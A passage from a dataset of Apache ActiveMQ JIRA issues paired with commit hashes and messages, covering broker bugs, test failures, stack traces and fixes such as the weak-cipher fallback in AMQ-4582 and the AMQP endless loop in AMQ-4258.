	at org.apache.activemq.broker.region.Topic.send(Topic.java:446)
	at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:406)
	at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:431)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:147)
	at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)
	at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:317)
	at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:152)
	at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:464)
	at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:751)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:294)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:149)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:288)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)
	at java.lang.Thread.run(Thread.java:680)
Caused by: java.sql.SQLException: Database &apos;target/derbydb_15&apos; not found.
	at org.apache.derby.impl.jdbc.SQLExceptionFactory40.getSQLException(Unknown Source)
	at org.apache.derby.impl.jdbc.Util.newEmbedSQLException(Unknown Source)
	at org.apache.derby.impl.jdbc.Util.newEmbedSQLException(Unknown Source)
	at org.apache.derby.impl.jdbc.Util.generateCsSQLException(Unknown Source)
	at org.apache.derby.impl.jdbc.EmbedConnection.newSQLException(Unknown Source)
	at org.apache.derby.impl.jdbc.EmbedConnection.handleDBNotFound(Unknown Source)
	at org.apache.derby.impl.jdbc.EmbedConnection.&lt;init&gt;(Unknown Source)
	at org.apache.derby.impl.jdbc.EmbedConnection30.&lt;init&gt;(Unknown Source)
	at org.apache.derby.impl.jdbc.EmbedConnection40.&lt;init&gt;(Unknown Source)
	at org.apache.derby.jdbc.Driver40.getNewEmbedConnection(Unknown Source)
	at org.apache.derby.jdbc.InternalDriver.connect(Unknown Source)
	at org.apache.derby.jdbc.EmbeddedDataSource.getConnection(Unknown Source)
	at org.apache.derby.jdbc.EmbeddedDataSource.getConnection(Unknown Source)
	at org.apache.activemq.store.jdbc.StopDBDuringProducerSendTopicTest$ReconnectingEmbeddedDataSource.getConnection(StopDBDuringProducerSendTopicTest.java:242)
	at org.apache.activemq.store.jdbc.TransactionContext.getConnection(TransactionContext.java:58)
	... 23 more
Caused by: java.lang.Throwable: org.apache.derby.impl.jdbc.EmbedSQLException: Database &apos;target/derbydb_15&apos; not found.
	at org.apache.derby.impl.jdbc.SQLExceptionFactory.getSQLException(Unknown Source)
	at org.apache.derby.impl.jdbc.SQLExceptionFactory40.wrapArgsForTransportAcrossDRDA(Unknown Source)
	... 38 more
{code}",29b90b58129e7a78cc00dabde923002da133efdf,https://issues.apache.org/jira/browse/AMQ-4643 - have keepAlive task trap the new suppressreplyexception such that it can stay alive and renew a lease on resumption
12658717,AMQ-4640,"We should run the JoramJmsTests using amqp+nio in order to get test coverage of AmqpNioTransport and AmqpNioTransportFactory.

I will attach a patch.
",3940f2dffd7f6c26710b016b0065b1a5621ea61f,"https://issues.apache.org/jira/browse/AMQ-4640


git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1506079 13f79535-47bb-0310-9956-ffa450edef68"
12653950,AMQ-4592,"It's changed to ""MySQL Connector Java""

http://dev.mysql.com/doc/relnotes/connector-j/en/news-5-1-25.html

We need to support this name in adapter selection

",661801ebcd3c051f38044cb8936f17365caa3d8d,"https://issues.apache.org/jira/browse/AMQ-4592 - mysql_connector_java adapter support

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1495049 13f79535-47bb-0310-9956-ffa450edef68"
12653240,AMQ-4585,"The system throws at least three different types of exceptions when a subscriber receives the first pending message without cleaning the session. The test case corresponds to receiving several messages from a publisher then closing the subscriber connection and finally reconnecting with setCleanSession(false) and attempt to read the messages published while the subscriber was disconnected.
The exceptions thrown:
{code}
java.net.ProtocolException: Command from server contained an invalid message id: 1
	at org.fusesource.mqtt.client.CallbackConnection.completeRequest(CallbackConnection.java:723)
	at org.fusesource.mqtt.client.CallbackConnection.processFrame(CallbackConnection.java:762)
	at org.fusesource.mqtt.client.CallbackConnection.access$1500(CallbackConnection.java:51)
	at org.fusesource.mqtt.client.CallbackConnection$6.onTransportCommand(CallbackConnection.java:392)
	at org.fusesource.hawtdispatch.transport.TcpTransport.drainInbound(TcpTransport.java:659)
	at org.fusesource.hawtdispatch.transport.SslTransport.drainInbound(SslTransport.java:264)
	at org.fusesource.hawtdispatch.transport.TcpTransport$6.run(TcpTransport.java:538)
	at org.fusesource.hawtdispatch.internal.NioDispatchSource$3.run(NioDispatchSource.java:209)
	at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.run(SerialDispatchQueue.java:100)
	at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:77)
{code}
{code}
java.lang.ArrayIndexOutOfBoundsException: 0
	at org.fusesource.mqtt.codec.MessageSupport$AckBase.decode(MessageSupport.java:81)
	at org.fusesource.mqtt.codec.PUBREC.decode(PUBREC.java:40)
	at org.fusesource.mqtt.client.CallbackConnection.processFrame(CallbackConnection.java:749)
	at org.fusesource.mqtt.client.CallbackConnection.access$1500(CallbackConnection.java:51)
	at org.fusesource.mqtt.client.CallbackConnection$6.onTransportCommand(CallbackConnection.java:392)
	at org.fusesource.hawtdispatch.transport.TcpTransport.drainInbound(TcpTransport.java:659)
	at org.fusesource.hawtdispatch.transport.SslTransport.drainInbound(SslTransport.java:264)
	at org.fusesource.hawtdispatch.transport.TcpTransport$6.run(TcpTransport.java:538)
	at org.fusesource.hawtdispatch.internal.NioDispatchSource$3.run(NioDispatchSource.java:209)
	at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.run(SerialDispatchQueue.java:100)
	at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:77)
{code}
{code}
java.net.ProtocolException: Unexpected MQTT command type: 0
	at org.fusesource.mqtt.client.CallbackConnection.processFrame(CallbackConnection.java:775)
	at org.fusesource.mqtt.client.CallbackConnection.access$1500(CallbackConnection.java:51)
	at org.fusesource.mqtt.client.CallbackConnection$6.onTransportCommand(CallbackConnection.java:392)
	at org.fusesource.hawtdispatch.transport.TcpTransport.drainInbound(TcpTransport.java:659)
	at org.fusesource.hawtdispatch.transport.SslTransport.drainInbound(SslTransport.java:264)
	at org.fusesource.hawtdispatch.transport.TcpTransport$6.run(TcpTransport.java:538)
	at org.fusesource.hawtdispatch.internal.NioDispatchSource$3.run(NioDispatchSource.java:209)
	at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.run(SerialDispatchQueue.java:100)
	at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:77)
{code}
No message is shown in the server. The problem doesn't occur always but most of the times the first reconnection attempt is made. With setCleanSession(true) the system works fine.
Code sample (publisher, permanently running):
{code}
MQTT mqtt = new MQTT();
mqtt.setHost(url);
mqtt.setUserName(user);
mqtt.setPassword(password);
mqtt.setClientId(""test_id"");

int i = 0;
while (true) {
	BlockingConnection connection = mqtt.blockingConnection();
	connection.connect();
	String message = ""TestMessage: "" + i;
	connection.publish(""TopicA"", message.getBytes(), QoS.AT_LEAST_ONCE, false);
	System.out.println(""Vendor: Sent message."");

	Thread.sleep(2500);
	connection.disconnect();
	Thread.sleep(2500);
	i++;
}
{code}
Code sample (subscriber, fails multiple times when restarting after the connection is closed):
{code}
BlockingConnection connection = null;
try {
    MQTT = new MQTT();
    mqtt.setHost(url);
    mqtt.setClientId(clientId);
    mqtt.setUserName(user);
    mqtt.setPassword(password);
    mqtt.setCleanSession(false);

    connection = mqtt.blockingConnection();
    connection.connect();
    Topic[] topics = {new Topic(""TopicA"", QoS.EXACTLY_ONCE)};
    byte[] qoses = connection.subscribe(topics);
    int numMessages = 1;
    while (numMessages % 10 != 0) {
        Message message = connection.receive();
        byte[] payload = message.getPayload();
        String messageContent = new String(payload);
        System.out.println(""Received message from topic: "" + message.getTopic() + "" Message content: "" + messageContent);
        message.ack();
        numMessages++;
    }
} finally {
    if(connection != null) {
        try {
            connection.disconnect();
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }
}
{code}
The test failed when using the current fusesource client (1.5) on ActiveMQ 5.9, on Mosquitto mqtt the code works correctly",2484c67cb148a49376ce98b5d5327e010bff74e6,"test case for: https://issues.apache.org/jira/browse/AMQ-4585

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1494222 13f79535-47bb-0310-9956-ffa450edef68"
12652700,AMQ-4582,"If you use an invalid cipher suite in the parameter ""transport.enabledCipherSuites"" on an SSL transport connector, the broker will start with all ciphers enabled.

For example, use this transport connector:

    <transportConnectors>
      <transportConnector name=""ssl"" uri=""ssl://localhost:61717?needClientAuth=true&amp;transport.enabledCipherSuites=foobar""/>
    </transportConnectors>


This is an attempt to enable the ciphersuite ""foobar"". The broker starts, and, in my environment I end up with 26 cipher suites enabled, 10 of which are generally considered weak.

Using the debugger I tracked this down to the method org.apache.activemq.util.IntrospectionSupport.setProperty. It uses reflection to invoke SSLServerSocket.setEnabledCipherSuites. That method throws an IllegalArgumentException if the specified ciphersuite is enabled. IntrospectionSupport.setProperty catches the exception and returns false.

I believe that this code should not be ignoring exceptions like this. This is a major security flaw: if a user is attempting to lock down ActiveMQ to a specific strong cipher suite, but makes a typo, the broker starts with with the ability to use weaker cipher suites.",1773e2c11cc3fdcc92e2d84bbc5ebb7c5a8e77f9,"fix for: https://issues.apache.org/jira/browse/AMQ-4582

treat bad enabledCipherSuites option as non-recoverable.  

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1512017 13f79535-47bb-0310-9956-ffa450edef68"
12651332,AMQ-4575,"
Without JMX enabled on the broker; when the DB is shutdown and subsequently restarted the JDBCIOExceptionHandler does a shutdown and restart on the transport connector as expected.

However when JMX is enabled on the broker the transport connector fails to restart throwing the following exception and subsequently shutting down the broker 

{code}

2013-06-06 15:25:22,113 [st IO exception] - INFO  DefaultIOExceptionHandler      - Stopping the broker due to exception, java.io.IOException: Transport Connector could not be registered in JMX: org.apache.activemq:type=Broker,brokerName=localhost,connector=clientConnectors,connectorName=tcp_//sideshow.home_61616
java.io.IOException: Transport Connector could not be registered in JMX: org.apache.activemq:type=Broker,brokerName=localhost,connector=clientConnectors,connectorName=tcp_//sideshow.home_61616
	at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:27)
	at org.apache.activemq.broker.BrokerService.registerConnectorMBean(BrokerService.java:1972)
	at org.apache.activemq.broker.BrokerService.startTransportConnector(BrokerService.java:2434)
	at org.apache.activemq.broker.BrokerService.startAllConnectors(BrokerService.java:2351)
	at org.apache.activemq.util.DefaultIOExceptionHandler$2.run(DefaultIOExceptionHandler.java:101)
Caused by: javax.management.InstanceAlreadyExistsException: org.apache.activemq:type=Broker,brokerName=localhost,connector=clientConnectors,connectorName=tcp_//sideshow.home_61616
	at com.sun.jmx.mbeanserver.Repository.addMBean(Repository.java:453)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.internal_addObject(DefaultMBeanServerInterceptor.java:1484)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerDynamicMBean(DefaultMBeanServerInterceptor.java:963)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerObject(DefaultMBeanServerInterceptor.java:917)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerMBean(DefaultMBeanServerInterceptor.java:312)
	at com.sun.jmx.mbeanserver.JmxMBeanServer.registerMBean(JmxMBeanServer.java:482)
	at org.apache.activemq.broker.jmx.ManagementContext.registerMBean(ManagementContext.java:380)
	at org.apache.activemq.broker.jmx.AnnotatedMBean.registerMBean(AnnotatedMBean.java:72)
	at org.apache.activemq.broker.BrokerService.registerConnectorMBean(BrokerService.java:1969)
	... 3 more

{code}",539a5f162ebb328c068b214ad582e86b2a50e556,"fix and test for: https://issues.apache.org/jira/browse/AMQ-4575

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1490343 13f79535-47bb-0310-9956-ffa450edef68"
12650837,AMQ-4568,"This test is currently hanging.  I'll attach a stack trace and a test patch which includes a timeout.
",d338d8a0d63af8b8c0ac153f0346ea5c2f24f4e1,"https://issues.apache.org/jira/browse/AMQ-4568

fix potential NPE

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1490317 13f79535-47bb-0310-9956-ffa450edef68"
12650132,AMQ-4563,"To reproduce this, do the following

1. Start a broker, create a producer using amqp, and send some messages
2. Stop/Start broker
3. Create a consumer to consume messages from step 1.
4. Stop/Start broker
5. Run consumer again.  It will receive the same messages it already received in step 3.

I will attach a unit test which reproduces this.
",34e8331829bd151a5056e72730af684a9d7ac72c,"Part of AMQ-4563: Include the textView as part of the persisted fields in OpenWire 10.

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1488354 13f79535-47bb-0310-9956-ffa450edef68"
12647440,AMQ-4534,"Cannot call BrokerService#deleteAllMessages() nor setDeleteAllMessagesOnStartup() when using ElectingLevelDBStore... this is because the elector has not yet been run, and is null. Simple solution is override it (like a handful of other methods that are not intended to be called without having an elected master) and give it a default behavior. ",63c0ef179a3421632f8172478f702e3646e4136c,"Fix for https://issues.apache.org/jira/browse/AMQ-4534 When using ElectingLevelDBStore cannot delete all messages on startup

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1482180 13f79535-47bb-0310-9956-ffa450edef68"
12645696,AMQ-4504,"With a backlog of messages on N destinations that exceeds the prefetch of the composite consumer for N, it is possible for dispatch on one destination to find the subscription full with messages from the other destinations.
If there are no pending messages for that destination it won't get an ack and hence won't attempt to dispatch again till there is another send. Leading to stalled pending messages.
The solution is to have a subscription wakeup all destination it is subscribed to once its dispatch list is exhausted.",4742c7d86f7312d2b023b8120064341051ab348d,"https://issues.apache.org/jira/browse/AMQ-4504 - ensure all dests in a composite get a chance to dispatch to a consumer after an ack

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1478183 13f79535-47bb-0310-9956-ffa450edef68"
12645516,AMQ-4500,"SparseAckReplayAfterStoreCleanupLevelDBStoreTest extends AMQ2832Test but uses LevelDB.  The test case testAlternateLossScenario is dependent on KahaDB, so it fails under SparseAckReplayAfterStoreCleanupLevelDBStoreTest.

I'll add a patch which skips this test when using LevelDB.
",d52e5910a51252b3091c543bb2a118f86661e58a,"apply patch: https://issues.apache.org/jira/browse/AMQ-4500

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1477830 13f79535-47bb-0310-9956-ffa450edef68"
12644624,AMQ-4487,"Hi,

When we browse a queue in webconsole we are getting java.lang.OutOfMemoryError: Java heap space. 
Memory allocation -----> -Xms512m -Xmx3G

When we try to click the queue to view the messages below error is occurring. We recently moved from 5.7 to 5.8 version. We dint face this issue in 5.7 version.

Kindly help in fixing the issue.

java.lang.OutOfMemoryError: Java heap space
        at java.util.Arrays.copyOf(Arrays.java:2882)
        at java.io.CharArrayWriter.write(CharArrayWriter.java:88)
        at java.io.PrintWriter.write(PrintWriter.java:382)
        at com.opensymphony.module.sitemesh.filter.RoutablePrintWriter.write(RoutablePrintWriter.java:144)
        at org.apache.jasper.runtime.JspWriterImpl.flushBuffer(JspWriterImpl.java:181)
        at org.apache.jasper.runtime.JspWriterImpl.write(JspWriterImpl.java:449)
        at org.apache.jasper.runtime.JspWriterImpl.write(JspWriterImpl.java:462)
        at org.apache.jsp.browse_jsp$browse_jspHelper.invoke0(org.apache.jsp.browse_jsp:382)
        at org.apache.jsp.browse_jsp$browse_jspHelper.invoke(org.apache.jsp.browse_jsp:450)
        at org.apache.jsp.tag.web.jms.forEachMessage_tag.doTag(org.apache.jsp.tag.web.jms.forEachMessage_tag:89)
        at org.apache.jsp.browse_jsp._jspx_meth_jms_forEachMessage_0(org.apache.jsp.browse_jsp:170)
        at org.apache.jsp.browse_jsp._jspService(org.apache.jsp.browse_jsp:100)
        at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:109)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
        at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:389)
        at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:486)
        at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:380)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
        at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:652)
        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1329)
        at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:83)
        at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1300)
        at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:45)
        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1300)
        at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:102)
        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1300)
        at com.opensymphony.sitemesh.webapp.SiteMeshFilter.obtainContent(SiteMeshFilter.java:129)
        at com.opensymphony.sitemesh.webapp.SiteMeshFilter.doFilter(SiteMeshFilter.java:77)
        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1300)
        at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:445)
        at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:137)


Thank you.

Regards,
Subathra.",b8a7e9990bfe66ad9fb47768722fcb35388f107b,"some fixes for: https://issues.apache.org/jira/browse/AMQ-4487

Add test case to demonstrate the issue with audit depth and QueueBrowsers.

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1489468 13f79535-47bb-0310-9956-ffa450edef68"
12644590,AMQ-4485,"With multiple concurrent transacted sends, transaction synchronisation after completions are used to update the cursors.
These happen independent of the order that the store is updated, and hence the store order index.
When the cache is exhausted, a callback to the store to mark the end of caching assumes matching order. If scheduling has swapped the order, it is possible to mark the order index past what is cached and it is possible to skip a dispatch. Alternatively it is possible to mark too early which results in duplicate dispatch if the audit is disabled or exhausted.

The senario that exposed this occurrence used concurrent transacted sends to 100 destinations with slow consumers. Leaving scope for out of order processing and ensuring that the cache is exhausted.

Using a large destination memory limit or systemUsage limit or useCache=false policy entry will avoid this problem. The order is only important when the cache is exhausted.
In the skipped case, the message appears on the queue but is not consumable, however it is consumable after a restart.

The proper fix is to ensure cursors are updated in the same order as the store.",a259537d650a49e2c7201e93298218addf3539e6,"https://issues.apache.org/jira/browse/AMQ-4485 - adding LevelDB variant of NegativeQueueTest

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1484484 13f79535-47bb-0310-9956-ffa450edef68"
12644590,AMQ-4485,"With multiple concurrent transacted sends, transaction synchronisation after completions are used to update the cursors.
These happen independent of the order that the store is updated, and hence the store order index.
When the cache is exhausted, a callback to the store to mark the end of caching assumes matching order. If scheduling has swapped the order, it is possible to mark the order index past what is cached and it is possible to skip a dispatch. Alternatively it is possible to mark too early which results in duplicate dispatch if the audit is disabled or exhausted.

The senario that exposed this occurrence used concurrent transacted sends to 100 destinations with slow consumers. Leaving scope for out of order processing and ensuring that the cache is exhausted.

Using a large destination memory limit or systemUsage limit or useCache=false policy entry will avoid this problem. The order is only important when the cache is exhausted.
In the skipped case, the message appears on the queue but is not consumable, however it is consumable after a restart.

The proper fix is to ensure cursors are updated in the same order as the store.",023b0f1987f495a3e84269f5c1164cf12ac39fe4,"https://issues.apache.org/jira/browse/AMQ-4485 - test case hangs on 1.7, subsequent tests fail with port in use - disabling pending some investigation"
12642778,AMQ-4472,"When using transactions an issue can arise where the consumer has messages in it's prefetch and when consumer.close() is called the consumer is not closed and does not release the messages.  


The use case is as follows:

1) Create producer
2) Create consumer
3) Send message to queue
4) Commit session
5) Send a new message
6) Close the consumer
7) Start a new consumer
8) Try to receive the message

Test case will be attached shortly.",705b3c5f9d30b8d780af59bfb96aeb9717ba4dcb,"https://issues.apache.org/jira/browse/AMQ-4472 - test case that shows the problem with prefetched messages and delayed close till commit

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1470459 13f79535-47bb-0310-9956-ffa450edef68"
12640745,AMQ-4435,"ActiveMQConnectionFactory contains ""consumerFailoverRedeliveryWaitPeriod"" to be applied to the connection created - however method ""populateProperties()"" ignores this property.

The following should be added to populateProperties() method

{code}
props.setProperty(""consumerFailoverRedeliveryWaitPeriod"", Long.toString(consumerFailoverRedeliveryWaitPeriod));
{code}",77fe814b9ec7970cec70833be0754fa8345eac38,"fix for: https://issues.apache.org/jira/browse/AMQ-4435

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1464568 13f79535-47bb-0310-9956-ffa450edef68"
12640485,AMQ-4432,"Validate use case in xml config as follows: {code}
<beans>
    <broker xmlns=""http://activemq.apache.org/schema/core""
            brokerName=""${broker-name}""
            dataDirectory=""${data}""
            start=""false"" />
    ...
    <camelContext id=""camel"" xmlns=""http://camel.apache.org/schema/spring"">
        <route id=""queueToDbTransacted"">
            <from uri=""activemq:queue:camel_in""/>
            <to uri=""activemq:queue:camel_out""/>
        </route>
    </camelContext>
</beans>
",ef6beb78fe483cab855ec5f76052616890e06f71,"https://issues.apache.org/jira/browse/AMQ-4432 - ensure camel-*.xsd can be found locally

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1463923 13f79535-47bb-0310-9956-ffa450edef68"
12640315,AMQ-4427,"260 out of 454 failed on the last run, mostl with ""java.net.BindException: Address already in use""
",2aed3a708cb026c85176ac65ecddabf54488a030,"patch for: https://issues.apache.org/jira/browse/AMQ-4427

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1463573 13f79535-47bb-0310-9956-ffa450edef68"
12639641,AMQ-4415,"Problem tests include:

AMQ2584Test 
AMQ2870Test  
QueueMbeanRestartTest 
FailoverTransactionTest
ConcurrentProducerDurableConsumerTest
DurableSubscriptionOfflineTest

The patch adds timeouts, and for the AMQ2584Test and AMQ2870Test does not run the LevelDB instance of the test, as these fail in tearDown, so timeouts do not prevent the tests from hanging.

Note:  Where possible I've changed these from using CombinationTestSupport to JUnit4 Parameterized tests with timeouts defined.  It looks like sometimes if a test which extends CombinationTestSupport turns on AutoFail and a timeout occurs, Maven reports the following:

Results :

Tests run: 0, Failures: 0, Errors: 0, Skipped: 0

",92b6bd23cf8f387ce1042f64b7f2a4a237898408,"https://issues.apache.org/jira/browse/AMQ-4415 - fix test regression, stop the autofail support

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1504436 13f79535-47bb-0310-9956-ffa450edef68"
12637213,AMQ-4377,"Even if don't need it to run the broker, in some osgi deployments people still may want to use it.",4276091e21ff4c4773aa614c45bd145b99a9d08f,"https://issues.apache.org/jira/browse/AMQ-4377 - bring back activemq-blueprint module

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1456991 13f79535-47bb-0310-9956-ffa450edef68"
12637021,AMQ-4371,"I have a standalone activemq installation.
In the web admin console, when i want to access to RSS or ATOM Feeds, I have an error page.

The page with RSS and ATOM : http://localhost:8161/admin/queues.jsp

The RSS Page who failed with this error ( ""Page Not Found!"" ).
http://localhost:8161/admin/queueBrowse/TestQueueOne?view=rss&feedType=rss_2.0

The RSS Page who failed with this error ( ""Page Not Found!"" ).
http://localhost:8161/admin/queueBrowse/TestQueueOne?view=rss&feedType=atom_1.0

",afc0220147fccfa6a4597cd0413f2e1cb02dea9d,AMQ-4371: Added back rss/atom feed support in old web console. Thanks to Robert Balent for the patch.
12631493,AMQ-4306,"This test runs very slowly on Solaris, taking 8-10 times as long as on Mac or Ubuntu.  It looks the the difference is almost all in the section where it builds the index.  I'll try to get more info later.

For now I'm attaching a patch which bumps up the timeout for this test so it doesn't cause the build to fail.",4e624b0393dbde007e09cb9fae3373b4b9b3666f,"Apply patch for: https://issues.apache.org/jira/browse/AMQ-4306

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1454501 13f79535-47bb-0310-9956-ffa450edef68"
12630676,AMQ-4296,"A couple of the unit tests that have be modified to run with LevelDB as the persistence adapter fail intermittently.

AMQ2870Test
AMQ2584Test#testSize
DuranleSubscriptionOfflineTest#testConsumeOnlyMatchedMessages
LevelDBXARecoveryBrokerTest#testTopicPersistentPreparedAcksAvailableAfterRestartAndRollback",6a097b97fe0ae316de93280271f31dffddd4bbbe,"https://issues.apache.org/jira/browse/AMQ-4296 - disable leveldb durable bits pending more work for 5.9

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1442953 13f79535-47bb-0310-9956-ffa450edef68"
12630676,AMQ-4296,"A couple of the unit tests that have be modified to run with LevelDB as the persistence adapter fail intermittently.

AMQ2870Test
AMQ2584Test#testSize
DuranleSubscriptionOfflineTest#testConsumeOnlyMatchedMessages
LevelDBXARecoveryBrokerTest#testTopicPersistentPreparedAcksAvailableAfterRestartAndRollback",548e52cde4d5f07f328b5ec56109026d9500ffdf,"another leveldb scenario that needs some investigation, but use case seems dubious - https://issues.apache.org/jira/browse/AMQ-4296

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1447700 13f79535-47bb-0310-9956-ffa450edef68"
12630676,AMQ-4296,"A couple of the unit tests that have be modified to run with LevelDB as the persistence adapter fail intermittently.

AMQ2870Test
AMQ2584Test#testSize
DuranleSubscriptionOfflineTest#testConsumeOnlyMatchedMessages
LevelDBXARecoveryBrokerTest#testTopicPersistentPreparedAcksAvailableAfterRestartAndRollback",5b5a818f4db6a472b194b2d2679b9212952272d9,"more exclusions - https://issues.apache.org/jira/browse/AMQ-4296

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1447725 13f79535-47bb-0310-9956-ffa450edef68"
12630676,AMQ-4296,"A couple of the unit tests that have be modified to run with LevelDB as the persistence adapter fail intermittently.

AMQ2870Test
AMQ2584Test#testSize
DuranleSubscriptionOfflineTest#testConsumeOnlyMatchedMessages
LevelDBXARecoveryBrokerTest#testTopicPersistentPreparedAcksAvailableAfterRestartAndRollback",b6703d6bd7b65cdd2175616bec59bcd1915f9a9c,"Fixes failing ThreeBrokerVirtualTopicNetwork test associated /w AMQ-4296

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1483878 13f79535-47bb-0310-9956-ffa450edef68"
12629704,AMQ-4281,"This depends on the order the tests are run in.  testConnectionFailsToConnectToVMBrokerThatIsNotRunning will fail if it is run after either testSetExceptionListener or testSetClientInternalExceptionListener.
",0b09fde97cba544fb0f31de72ce89202bdb97c6e,"Apply patch for: https://issues.apache.org/jira/browse/AMQ-4281

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1440012 13f79535-47bb-0310-9956-ffa450edef68"
12628741,AMQ-4266,We missed proton-api as dependency.,5ffb7a849a2df086612186287600367a5d296f2b,"apply patch for: https://issues.apache.org/jira/browse/AMQ-4266

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1437049 13f79535-47bb-0310-9956-ffa450edef68"
12627699,AMQ-4258,"When you send incorrect message to AMQP transform, it will stuck in endless loop and write lot of error messages to console output.

This way, you can send numbers of incorrect messages and ActiveMQ will create new thread for each of them. This way can attacker create thousands of threads in few minutes and completely overload server machine.

Problem is in org.apache.activemq.transport.amqp.AmqpProtocolConverter class. It throws exception(exception.txt) and loop never ends:

Line 158:
int count = protonTransport.input(frame.data, frame.offset, frame.length);

Two solutions are possible:

1. Add ""return"" statement to catch block (patch1.txt).
2. Run ""frame.moveHead(count);"" in finally block with some default positive count (patch2.txt)

I would prefer the first variant.

This happens when you try to send message from client with older version of AMQP protocol.",77312e5a6487dd2bd384bf3cf167cef6b61aa658,"Fixes AMQ-4258: Endless loop when received incorrect AMQP message

Applied patch sumbitted by Robert Balent.  Many thanks!



git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1437427 13f79535-47bb-0310-9956-ffa450edef68"
12627470,AMQ-4254,"BrokerXmlConfigStartTest.testStartBrokerUsingSampleConfig fails intermittently on Hudson/Jenkins with the error 

""Error creating bean with name 'Server' defined in file [/home/hudson/hudson-slave/workspace/ActiveMQ-Java7/assembly/target/conf/jetty-demo.xml]: Invocation of init method failed; nested exception is java.net.BindException: Address already in use""

I will attach a patch with this test rewritten as a JUnit4 Parameterized test. This creates runs each config as a separate test case and seems to resolve the broker start/stop issue.",7011ea5b132509878e031c4347671904569c77c1,"fix for: https://issues.apache.org/jira/browse/AMQ-4254

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1433683 13f79535-47bb-0310-9956-ffa450edef68"
12623775,AMQ-4221,"{code}2012-12-13 11:37:27,027 [calhost] Task-1] - ERROR Queue                          - Failed to page in more queue messages 
java.lang.NullPointerException
	at org.apache.kahadb.index.ListNode.access$200(ListNode.java:37)
	at org.apache.kahadb.index.ListNode$NodeMarshaller.writePayload(ListNode.java:265)
	at org.apache.kahadb.index.ListNode$NodeMarshaller.writePayload(ListNode.java:255)
	at org.apache.kahadb.page.Transaction.store(Transaction.java:248)
	at org.apache.kahadb.index.ListIndex.storeNode(ListIndex.java:326)
	at org.apache.kahadb.index.ListNode.store(ListNode.java:332)
